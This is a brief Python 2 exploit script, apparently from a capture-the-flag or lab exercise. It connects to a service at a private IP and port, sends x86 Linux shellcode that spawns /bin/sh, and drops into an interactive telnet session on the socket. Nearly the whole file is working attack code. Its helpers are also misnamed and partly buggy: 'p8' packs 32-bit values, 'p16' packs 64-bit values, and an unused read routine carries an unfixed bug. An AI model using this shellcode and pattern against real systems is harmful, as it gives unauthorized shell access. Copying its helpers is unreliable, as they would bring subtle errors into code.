import struct
import telnetlib
from socket import *

p8 = lambda x : struct.pack("<L", x)
p16 = lambda x : struct.pack("<Q", x)

def ReadUntil(s, chkStr, isPrint = True) :
    chkLen = len(chkStr)
    data = s.recv(1)
    while True :
        while data[-1] != chkStr[0] :
            data += s.recv(1)
        tem = s.recv(chkLen - 1)
        data += tem
        # tem possible part of chkStr
        # need to fix
        if tem == chkStr[1:] :
            break
        
    if isPrint :
        print data

HOST = "10.0.66.71"
PORT = 6698

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

#exploit!

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\n"
s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
